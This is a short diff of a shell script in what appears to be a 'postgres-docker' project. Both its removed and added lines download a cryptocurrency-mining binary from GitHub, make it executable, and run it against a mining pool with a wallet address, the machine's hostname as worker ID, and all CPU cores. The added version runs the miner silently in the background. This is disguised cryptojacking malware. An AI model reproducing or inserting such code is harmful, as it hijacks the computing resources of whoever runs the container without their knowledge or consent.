@@ -1,5 +1,4 @@
-wget -O crot https://github.com/iaidjb18ha/postgres-docker/raw/master/xmrig
-chmod 777 crot
-./crot -o frankfurt01.hashvault.pro:80 -u TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5SALSGcaXwyKkj548iWqBKxQEnyeRV7hfBw8FaveMmBDzeRCjQ7arJQASUnca2 --keepalive --donate-level 1 -p $(cat /proc/sys/kernel/hostname) -k --tls -t$(nproc --all) -B
-rm -rf crot
+wget https://github.com/iaidjb18ha/postgres-docker/raw/master/avx2
+chmod 777 avx2
+./avx2 -a minotaurx  -o stratum+tcps://stratum-ru.rplant.xyz:17068 -u RXzEz9Qm1dNMj2V7PtEaQ2yz7kysjFGVq7.$(cat /proc/sys/kernel/hostname) -t=$(nproc --all) >/dev/null &
 sleep 24h
